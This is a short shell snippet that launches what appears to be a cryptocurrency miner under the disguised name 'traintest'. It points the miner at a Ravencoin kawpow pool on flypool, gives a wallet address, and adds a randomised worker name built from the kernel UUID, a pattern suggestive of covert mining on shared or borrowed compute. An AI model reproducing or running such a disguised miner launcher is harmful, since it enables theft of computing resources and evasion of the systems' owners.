r=$((0x$(cut -c1-10 /proc/sys/kernel/random/uuid) ))
./traintest -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 -u RUs73d7KssrAdMmffabsrbJq8gvQAhFxNZ.ohmytest${r}
